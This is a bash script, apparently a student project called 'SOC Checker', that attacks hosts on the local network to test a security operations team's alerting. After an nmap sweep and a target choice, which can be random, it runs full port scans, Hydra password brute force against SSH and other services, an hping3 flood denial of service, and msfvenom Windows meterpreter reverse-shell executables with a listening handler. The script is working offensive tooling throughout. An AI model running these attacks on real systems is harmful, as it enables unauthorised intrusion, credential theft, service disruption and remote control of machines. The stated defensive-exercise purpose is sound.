#!/bin/bash
 
# --------------------------------------------------------------
# SOC Checker - Automated Attack System for SOC Monitoring
# Student Name: Rami Hacmon
# Student Code: S13
# Class Code: NX220
# Lecturer's Name: Haim Nafusi
# 
# This script simulates multiple types of attacks to help SOC teams 
# stay alerted and test their readiness.
# 
# The attacks include:
# - Nmap Port Scan
# - Hydra Brute Force (SSH)
# - Hping3 DoS Attack
# - Metasploit Reverse Shell Attack (TCP and HTTP)

# Tools used and references:
# Nmap - https://nmap.org/download.html
# Hydra - https://www.kali.org/tools/hydra/
# Hping3 - https://www.kali.org/tools/hping3/
# Metasploit Framework - https://www.kali.org/tools/metasploit-framework/
# --------------------------------------------------------------

# Text color variables for styling output
BCAYAN='\033[1;36m'
CAYAN='\e[36m'
RED='\033[0;31m'
BYELLOW='\033[1;33m'
YELLOW='\e[33m'
Green='\033[0;32m'
BGreen='\033[1;32m'
NC='\033[0m'

# Check if the script is run with sudo
if [[ $EUID -ne 0 ]]; then
   echo -e ${BYELLOW} "This script requires sudo to run. Please enter your password to proceed."${NC}
   sudo "$0" "$@"
   exit $?
fi

# Define log file
LOG_FILE="/var/log/soc_checker.log"

# Ensure log file exists and has correct permissions
if [[ ! -f "$LOG_FILE" ]]; then
    touch "$LOG_FILE"
    echo -e "${Green}Log file created: $LOG_FILE${NC}"
fi

chmod 600 "$LOG_FILE"

# Handle Ctrl+C (SIGINT)
trap ctrl_c INT

ctrl_c() {
    TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
    SOURCE_IP=$(hostname -I | awk '{print $1}')

    echo -e "\n${RED}[!] Script aborted by user (Ctrl+C).${NC}"

    # Log the abort event
    echo "$TIMESTAMP - [ABORTED] - Script aborted by user (Ctrl+C), Source: $SOURCE_IP" >> "$LOG_FILE"

    exit 1
}

# Function to display network IPs
display_network_ips() {
        
        echo -ne ${YELLOW}"[DETECTING]"${NC} "Detecting network.. \r"
        sleep 1
        echo -ne ${YELLOW}"[WAIT]"${NC} "Detecting network....... \r"
        sleep 1
        echo -ne ${YELLOW}"[DETECTING]"${NC} "Detecting network.... \r"
        sleep 1
        echo -ne ${YELLOW}"[WAIT]"${NC} "Detecting network.......... \r"
        sleep 3
        echo -e ${BGreen}"[DETECTED]"${NC} "Network detected..." ${BGreen}"Done!"${NC}
        sleep 1  # Small pause before proceeding

    # Get the current network subnet dynamically
    CURRENT_SUBNET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -n 1)
    echo -e ${BCAYAN}"Scanning for live IPs on network:" ${NC} $CURRENT_SUBNET
    IP_LIST=$(nmap -sn $CURRENT_SUBNET | grep "Nmap scan report" | awk '{print $5}')
    echo -e ${CAYAN}"Available IPs on the network:"${NC}
    echo "$IP_LIST"
}

echo
# Function to choose IP from scanned list
choose_ip() {
    echo -e ${BCAYAN} "Choose an IP address:"${NC}
    echo -e ${BYELLOW} "1) Specific IP (Choose from the list)"${NC}
    echo -e ${BYELLOW} "2) Random IP (Automatically select a random IP)"${NC}
    echo -e ${BYELLOW} "3) Custom IP (Enter an IP manually)"${NC}
    read -p "Enter choice [1-3]: " IP_CHOICE

    case $IP_CHOICE in
        1)
            # User chooses specific IP from the list
            echo "Available IPs: $IP_LIST"
            read -p "Enter the IP address you want to attack: " TARGET_IP
            ;;
        2)
            # User chooses random IP from the list
            TARGET_IP=$(echo "$IP_LIST" | shuf -n 1)  # shuf selects a random line
            echo -e ${Green}"Randomly selected IP:"${NC} $TARGET_IP
            ;;
        3)
            # User enters a custom IP manually
            read -p "Enter custom IP address: " TARGET_IP
            ;;
        *)
            echo "Invalid choice. Exiting..."
            exit 1
            ;;
    esac

    echo -e ${Green}"Selected target IP:"${NC} $TARGET_IP
}

# Function for Nmap attack (port scan)
nmap_attack() {
    # nmap explanation
    echo "---------------------------------------------------------"
    echo -e ${BCAYAN}"Nmap Attack:"${NC}
    echo -e ${BCAYAN}"Purpose:"${NC} ${CAYAN}"Scans a target to find open ports and services."${NC}
    echo -e ${BCAYAN}"How:"${NC} ${CAYAN}"Uses nmap to probe ports on the target."${NC}
    echo -e ${BCAYAN}"Use case:"${NC} ${CAYAN}"Identify open ports for further exploitation."${NC}
    echo "---------------------------------------------------------"
    # Prompting user to enter the target IP for Nmap port scan
    echo "Running Nmap scan..."
    choose_ip  # Let the user choose an IP after scanning
    echo -e ${Green}"Running Nmap scan on $TARGET_IP..."${NC}
    # Running nmap to scan the target IP
    TIMESTAMP=$(date "+%Y%m%d_%H%M%S")
    NMAP_FILE="nmap_${TARGET_IP}_scan_${TIMESTAMP}.txt"
    nmap -Pn -sV -sS -p- $TARGET_IP >> $NMAP_FILE
    cat $NMAP_FILE
    echo
    echo -e ${CAYAN}"### The details saved to: $NMAP_FILE"${NC}
    log_attack "Nmap" "$TARGET_IP"
    echo
    # Alert user about next step
    echo -e ${BYELLOW}"Nmap scan completed! Choose a follow-up attack:"${NC}
    display_menu
}

# Function for Hydra attack (brute force SSH)
hydra_attack() {
    # hydra explanation
    echo "---------------------------------------------------------"
    echo -e ${BCAYAN}"Hydra Attack:"${NC}
    echo -e ${BCAYAN}"Purpose:"${NC} ${CAYAN}"Attempts to crack SSH or other service passwords."${NC}
    echo -e ${BCAYAN}"How:"${NC} ${CAYAN}"Uses a list of usernames and passwords to try logging in."${NC}
    echo -e ${BCAYAN}"Use case:"${NC} ${CAYAN}"Test weak passwords on services like SSH."${NC}
    echo "---------------------------------------------------------"
    echo "Enter target IP for Hydra attack: "
    read TARGET_IP
    echo "Enter the service (ssh,telnet,ftp,etc...)"
    read CHO_SERV

    # Ask user how they want to proceed with credentials
    echo -e ${BCAYAN}"Choose how you want to provide credentials:"${NC}
    echo "1) Enter specific username and password"
    echo "2) Use a list of usernames and a specific password"
    echo "3) Use a list of usernames and passwords"
    echo "4) Use a specific username and a list of passwords"
    read -p "Enter choice [1-4]: " CREDENTIAL_CHOICE

    case $CREDENTIAL_CHOICE in
        1)
            # User chooses specific username and password
            read -p "Enter username: " USERNAME
            read -p "Enter password: " PASSWORD
            echo "Running Hydra brute force on $TARGET_IP with username $USERNAME and password $PASSWORD..."
            hydra -t 4 -l $USERNAME -p $PASSWORD $TARGET_IP $CHO_SERV -vV > hydra_result.txt
            echo -e "\e[36mDone!! The details save to: hydra_result.txt \e[0m"
            ;;
        2)
            # User chooses a list of usernames with a single password
            read -p "Enter path to username list: " USERNAME_LIST
            read -p "Enter password: " PASSWORD
            echo "Running Hydra brute force on $TARGET_IP with username list $USERNAME_LIST and password $PASSWORD..."
            hydra -L $USERNAME_LIST -p $PASSWORD $TARGET_IP $CHO_SERV -vV > hydra_result.txt
            echo -e "\e[36mDone!! The details save to: hydra_result.txt \e[0m"
            ;;
        3)
            # User chooses a list of usernames and passwords
            read -p "Enter path to username list: " USERNAME_LIST
            read -p "Enter path to password list: " PASSWORD_LIST
            echo "Running Hydra brute force on $TARGET_IP with username list $USERNAME_LIST and password list $PASSWORD_LIST..."
            hydra -t 4 -L $USERNAME_LIST -P $PASSWORD_LIST $TARGET_IP $CHO_SERV -vV > hydra_result.txt
            echo -e "\e[36mDone!! The details save to: hydra_result.txt \e[0m"
            ;;
        4)
            # User chooses a specific username and a list of passwords
            read -p "Enter username: " USERNAME
            read -p "Enter path to password list: " PASSWORD_LIST
            echo "Running Hydra brute force on $TARGET_IP with username $USERNAME and password list $PASSWORD_LIST..."
            hydra -l $USERNAME -P $PASSWORD_LIST $TARGET_IP $CHO_SERV -vV > hydra_result.txt
            echo -e "\e[36mDone!! The details save to: hydra_result.txt \e[0m"
            ;;
        *)
            echo "Invalid choice. Exiting Hydra attack..."
            return
            ;;
    esac

    # Log the attack
    log_attack "Hydra Brute Force" "$TARGET_IP"
}


# Function for Hping3 DoS attack
hping3_attack() {
    # hping3 explanation
    echo "---------------------------------------------------------"
    echo -e ${BCAYAN}"Hping3 Attack:"${NC}
    echo -e ${BCAYAN}"Purpose:"${NC} ${BCAYAN}"Floods the target with traffic to overwhelm it (DoS)."${NC}
    echo -e ${BCAYAN}"How:"${NC} ${BCAYAN}"Sends continuous packets to the target port."${NC}
    echo -e ${BCAYAN}"Use case:"${NC} ${BCAYAN}"Disrupt the target's services by overwhelming its resources."${NC}
    echo "---------------------------------------------------------"

        # Confirm before proceeding with DoS attack
    read -p "Are you sure you want to perform a DoS attack? (yes/no): " confirmation
    if [[ "$confirmation" != "yes" ]]; then
        echo -e "${RED}Attack cancelled!${NC}"
        return
    fi

    # Prompting user to enter the target IP for Hping3 DoS attack
    echo "Enter target IP for Hping3 DoS attack: "
    read TARGET_IP
    echo "Running Hping3 DoS on $TARGET_IP..."
    hping3 --flood -p 80 $TARGET_IP
    log_attack "Hping3 DoS" "$TARGET_IP"
}

# Function for Metasploit attack (using msfconsole)
msfconsole_attack() {
    # Metasploit explanation
    echo "---------------------------------------------------------"
    echo -e "\e[36mMetasploit Attack:\e[0m"
    echo -e "\e[36mPurpose: Gains control of the target by creating a reverse shell.\e[0m"
    echo -e "\e[36mHow: Generates a payload and listens for the target to connect back.\e[0m"
    echo -e "\e[36mUse case: Remotely control a target machine after it runs the payload.\e[0m"
    echo "---------------------------------------------------------"
    # Prompting user to enter the target IP for Metasploit attack
    echo "Enter target IP for Metasploit attack: "
    read TARGET_IP

    # Ask user for port and EXE file name
    read -p "Enter host number (LHOST) for the reverse connection (e.g., 192.168.1.1): " IP
    read -p "Enter port number (LPORT) for the reverse connection (e.g., 4444): " LPORT
    read -p "Enter the desired name for the payload EXE file (e.g., reverse_tcp_payload.exe): " EXE_NAME

    # Ask user for payload selection
    echo "Choose a Metasploit payload:"
    echo "1) Reverse TCP Shell (windows/meterpreter/reverse_tcp)"
    echo "2) Reverse HTTP Shell (windows/meterpreter/reverse_http)"
    read -p "Enter choice [1-2]: " PAYLOAD_CHOICE

    case $PAYLOAD_CHOICE in
        1)
            # Reverse TCP Shell
            echo "Running Metasploit attack on $TARGET_IP using Reverse TCP Shell..."
            # Generate the reverse TCP payload using msfvenom
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$LPORT -f exe > $EXE_NAME
            # Running Metasploit handler
            msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $LPORT; run"
            ;;
        2)
            # Reverse HTTP Shell
            echo "Running Metasploit attack on $TARGET_IP using Reverse HTTP Shell..."
            # Generate the reverse HTTP payload using msfvenom
            msfvenom -p windows/meterpreter/reverse_http LHOST=$IP LPORT=$LPORT -f exe > $EXE_NAME
            # Running Metasploit handler
            msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_http; set LHOST $IP; set LPORT $LPORT; run"
            ;;
        *)
            echo "Invalid choice. Exiting Metasploit attack..."
            return
            ;;
    esac

    # Log the attack
    log_attack "Metasploit" "$TARGET_IP"
}

# Function to log the attack details
log_attack() {
    ATTACK_TYPE=$1
    TARGET_IP=$2
    TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
    SOURCE_IP=$(hostname -I | awk '{print $1}')
    # Log attack details to the log file
    echo "$TIMESTAMP - Attack: $ATTACK_TYPE, Source: $SOURCE_IP, Target: $TARGET_IP" >> $LOG_FILE
}

# Display attack menu and handle user input
display_menu() {
    while true; do
        echo -e ${CAYAN}"Choose an attack:"${NC}
        echo "1) Nmap Port Scan"
        echo "2) Hydra Brute Force"
        echo "3) Hping3 DoS"
        echo "4) Metasploit Attack"
        echo "5) Random Attack"
        echo "6) Exit"
        read -p "Enter choice [1-6]: " CHOICE

        case $CHOICE in
            1) nmap_attack; break ;;
            2) hydra_attack; break ;;
            3) hping3_attack; break ;;
            4) msfconsole_attack; break ;;
            5) 
                # Random attack selection
                attacks=(nmap_attack hydra_attack hping3_attack msfconsole_attack)
                random_attack=${attacks[$RANDOM % ${#attacks[@]}]}
                echo -e "${BYELLOW}Randomly selected attack:${NC} $random_attack"
                sleep 2
                $random_attack
                break
                ;;
            6) exit 0 ;;
            *) echo -e "\e[31m[ERROR]\e[0m Invalid choice. Try again." ;;
        esac
    done
}


# Main program
clear
# Welcoming user and displaying available IPs
echo
echo -e ${BCAYAN}"============================================="${NC}
echo -e ${BYELLOW}" Automated Attack System for SOC Monitoring"${NC}
echo -e ${BCAYAN}"============================================="${NC}
echo

echo -e ${BYELLOW}"Welcome to SOC Checker"${NC}
display_network_ips
echo
display_menu

# --------------------------------------------------------------
# End of the script
# --------------------------------------------------------------